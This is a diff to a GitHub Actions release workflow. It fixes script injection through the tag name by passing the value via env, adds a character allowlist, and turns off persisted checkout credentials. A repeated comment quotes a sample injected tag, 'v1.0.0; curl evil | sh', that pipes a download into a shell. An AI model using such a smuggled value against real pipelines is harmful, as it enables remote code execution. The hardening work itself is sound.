@@ -55,13 +55,28 @@ jobs:
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
+          persist-credentials: false
           fetch-depth: 0
 
       - name: Pin the candidate tag to the exact commit it names right now
         id: pin
+        # Through env, never interpolated into the script text. The vMAJOR.MINOR.PATCH check two
+        # lines below reads like it sanitises this value, but ${{ }} is substituted before bash
+        # sees the script at all: a tag or a workflow_dispatch input carrying a quote and a
+        # semicolon would run as code, and the validation it was supposed to face would never be
+        # reached. env is the only placement where the check actually guards anything.
+        env:
+          CANDIDATE_TAG: ${{ github.event.inputs.tag || github.ref_name }}
         run: |
           set -euo pipefail
-          TAG="${{ github.event.inputs.tag || github.ref_name }}"
+          TAG="$CANDIDATE_TAG"
+          # Two checks, because the first one is a glob and a glob is not a validator: `*` absorbs
+          # anything, so "v1.0.0; curl evil | sh 0.0.0" matches v[0-9]*.[0-9]*.[0-9]* perfectly
+          # well. The character allowlist is what actually bounds the value; the shape check is
+          # what makes it a version.
+          case "$TAG" in
+            *[!v0-9.]*) echo "refusing: '$TAG' carries a character no version tag has"; exit 1 ;;
+          esac
           case "$TAG" in
             v[0-9]*.[0-9]*.[0-9]*) ;;
             *) echo "refusing: '$TAG' is not a vMAJOR.MINOR.PATCH tag"; exit 1 ;;
@@ -194,6 +209,7 @@ jobs:
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
+          persist-credentials: false
           ref: ${{ needs.resolve.outputs.sha }}
 
       - name: Published-artifact install, three foreign container images
@@ -231,6 +247,11 @@ jobs:
       contents: write
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        # persist-credentials stays TRUE here, alone in this file: the step below deletes a
+        # remote tag with `git push`, and that push authenticates with exactly the credential
+        # actions/checkout leaves in .git/config. Turning it off would make the deletion fail
+        # silently-ish and leave an unearned tag published. Named rather than left implicit,
+        # because the next person reading the other three will wonder why this one differs.
 
       - name: Has anything actually decided against this tag?
         id: decide
@@ -250,9 +271,23 @@ jobs:
 
       - name: Delete the candidate tag; it did not earn publication
         if: steps.decide.outputs.delete == 'yes'
+        # Same reasoning as the pin step, and it matters more here: this step deletes a remote ref.
+        env:
+          CANDIDATE_TAG: ${{ github.event.inputs.tag || github.ref_name }}
         run: |
           set -euo pipefail
-          TAG="${{ github.event.inputs.tag || github.ref_name }}"
+          TAG="$CANDIDATE_TAG"
+          # Two checks, because the first one is a glob and a glob is not a validator: `*` absorbs
+          # anything, so "v1.0.0; curl evil | sh 0.0.0" matches v[0-9]*.[0-9]*.[0-9]* perfectly
+          # well. The character allowlist is what actually bounds the value; the shape check is
+          # what makes it a version.
+          case "$TAG" in
+            *[!v0-9.]*) echo "refusing: '$TAG' carries a character no version tag has"; exit 1 ;;
+          esac
+          case "$TAG" in
+            v[0-9]*.[0-9]*.[0-9]*) ;;
+            *) echo "refusing: '$TAG' is not a vMAJOR.MINOR.PATCH tag"; exit 1 ;;
+          esac
           if git ls-remote --exit-code --tags origin "refs/tags/$TAG" >/dev/null 2>&1; then
             git push origin ":refs/tags/$TAG"
             echo "deleted refs/tags/$TAG -- required checks did not pass for the commit it named"
@@ -269,6 +304,7 @@ jobs:
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
+          persist-credentials: false
           fetch-depth: 0
 
       - name: The tag still points where resolve found it
